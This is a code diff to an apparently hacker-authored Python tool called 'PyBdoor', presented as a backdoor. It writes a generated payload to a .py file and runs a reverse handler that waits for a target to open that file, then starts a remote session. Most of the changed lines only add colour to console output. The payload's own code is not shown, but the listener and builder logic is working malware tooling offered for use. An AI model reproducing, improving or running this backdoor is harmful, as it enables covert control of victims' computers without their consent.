@@ -1,3 +1,6 @@
+# PyBdoor/ backdoor python
+# twitter : @Anonym0us_VNPC
+# Telegram : @Anon0psNews
 import socket
 import time
 import sys
@@ -28,7 +31,7 @@ def banner():
 	print("Copyright : ph4mch13n")
 	print("Twitter : @Anonym0us_VNPC")
 	print("Tele : https://t.me/Anon0psNews")
-	print("Github : /Phamchie")
+	print("Github : /Phamchie" + Style.RESET_ALL)
 	print('''
 ========================================================
 | command                 options                      |
@@ -58,6 +61,10 @@ filename = 'null'
 session = True
 while session:
 	print(Style.RESET_ALL)
+
+	red = {Fore.RED}
+	white = {Fore.WHITE}
+
 	text_main = input("pybdoor(backdoor) > ")
 
 	if text_main == "help":
@@ -81,11 +88,11 @@ while session:
 
 	elif text_main == "set host":
 		lhost = input("HOST : ")
-		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set LHOST : {lhost}")
+		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set LHOST : " + Fore.GREEN + f"{lhost}")
 
 	elif text_main == "set port":
 		lport = input("PORT : ")
-		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set LPORT : {lport}")
+		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set LPORT : " + Fore.GREEN + f"{lport}")
 
 	elif text_main == "set file":
 		filename = input("File Name : ")
@@ -138,7 +145,7 @@ while True:
 		with open(f'{filename}.py', 'w') as file:
 			file.write(code)
 
-		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set filename {filename}.py")
+		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set filename " + Fore.GREEN + f"{filename}.py")
 
 
 	elif text_main == "options":
@@ -146,13 +153,13 @@ while True:
 ======================================
 | options | IP              | PORT   |   
 |=====================================
-| LHOST   : {lhost}         {lport}
+| LHOST   : {Fore.GREEN}{lhost}         {lport}{Style.RESET_ALL}
 ======================================
 
 =======================
 | options |  File name|
 =======================
-| FILENAME | {filename}.py
+| FILENAME | {Fore.GREEN}{filename}.py{Style.RESET_ALL}
 =======================
 ''')
 
@@ -177,19 +184,19 @@ while True:
 
 
 		print("")
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting Reverse Handler On {lhost}:{lport}')
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting Reverse Handler On ' + Fore.GREEN + f'{lhost}:{lport}' + Style.RESET_ALL)
 		time.sleep(2)
 		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Startingthe payload backdoor...')
 		time.sleep(1)
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Server is listening on '+ str(lhost) + ":" + str(lport) + '...')
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Server is listening on '+ Fore.GREEN + str(lhost) + ":" + str(lport) + '...' + Style.RESET_ALL)
 		
 		conn, addr = s.accept()
 		
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' 1 target has open the file, service as started ', addr)
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' 1 target has open the file, service as started ', Fore.GREEN, addr)
 		time.sleep(2)
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' wait for connecting session ', addr)
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' wait for connecting session ', Fore.GREEN, addr)
 		time.sleep(1)
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' session started ', str(addr) + '...')
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' session started ' + Fore.GREEN + str(addr) + '...' + Style.RESET_ALL)
 
 		session_door = True
 
@@ -233,20 +240,19 @@ while True:
 
 
 		print("")
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting Reverse Handler On {lhost}:{lport}')
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting Reverse Handler On ' + Fore.GREEN + f'{lhost}:{lport}' + Style.RESET_ALL)
 		time.sleep(2)
 		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Startingthe payload backdoor...')
 		time.sleep(1)
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Server is listening on '+ str(lhost) + ":" + str(lport) + '...')
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Server is listening on '+ Fore.GREEN + str(lhost) + ":" + str(lport) + '...' + Style.RESET_ALL)
 		
 		conn, addr = s.accept()
-
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' 1 target has open the file, service as started ', addr)
+		
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' 1 target has open the file, service as started ', Fore.GREEN, addr)
 		time.sleep(2)
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' wait for connecting session ', addr)
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' wait for connecting session ', Fore.GREEN, addr)
 		time.sleep(1)
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' session started ', str(addr) + '...')
-
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' session started ' + Fore.GREEN + str(addr) + '...' + Style.RESET_ALL)
 		session_door = True
 
 		while True:
